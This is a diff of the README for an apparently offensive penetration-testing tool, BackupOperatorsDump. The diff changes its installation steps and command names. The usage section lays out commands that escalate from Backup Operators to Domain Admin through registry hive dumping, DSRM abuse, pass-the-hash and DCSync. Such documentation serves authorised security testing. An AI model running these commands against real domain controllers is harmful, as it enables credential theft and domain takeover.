@@ -36,29 +36,43 @@ With local admin, the SECURITY hive becomes accessible. It contains `$MACHINE.AC
 
 ## Installation
 
+### pipx (recommended)
+
 ```bash
-git clone https://github.com/<your-handle>/BackupOperatorsDump.git
+pipx install git+https://github.com/TazeguID/BackupOperatorsDump.git
+```
+
+### pip
+
+```bash
+pip install git+https://github.com/TazeguID/BackupOperatorsDump.git
+```
+
+### From source
+
+```bash
+git clone https://github.com/TazeguID/BackupOperatorsDump.git
 cd BackupOperatorsDump
-pip install -r requirements.txt
+pip install .
 ```
 
 ## Usage
 
 ```bash
 # Full chain: Backup Operators → Domain Admin (single command)
-python3 backup_dc_dump.py -t <DC_IP> -u <backup_ops_user> -p '<password>' -d <domain>
+backupoperatorsdump -t <DC_IP> -u <backup_ops_user> -p '<password>' -d <domain>
 
 # With pass-the-hash
-python3 backup_dc_dump.py -t <DC_IP> -u <user> -H ':<NT_HASH>' -d <domain>
+backupoperatorsdump -t <DC_IP> -u <user> -H ':<NT_HASH>' -d <domain>
 
 # Save output to specific directory
-python3 backup_dc_dump.py -t <DC_IP> -u <user> -p '<pass>' -d <domain> -o /tmp/loot
+backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> -o /tmp/loot
 
 # Registry dump only (no DSRM exploitation)
-python3 backup_dc_dump.py -t <DC_IP> -u <user> -p '<pass>' -d <domain> --reg-only
+backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --reg-only
 
 # Don't cleanup (leave DsrmAdminLogonBehavior=2)
-python3 backup_dc_dump.py -t <DC_IP> -u <user> -p '<pass>' -d <domain> --no-cleanup
+backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --no-cleanup
 ```
 
 ## Options
@@ -134,4 +148,3 @@ Phase 6: DCSync via $MACHINE.ACC
 ## License
 
 MIT
-# BackupOperatorsDump
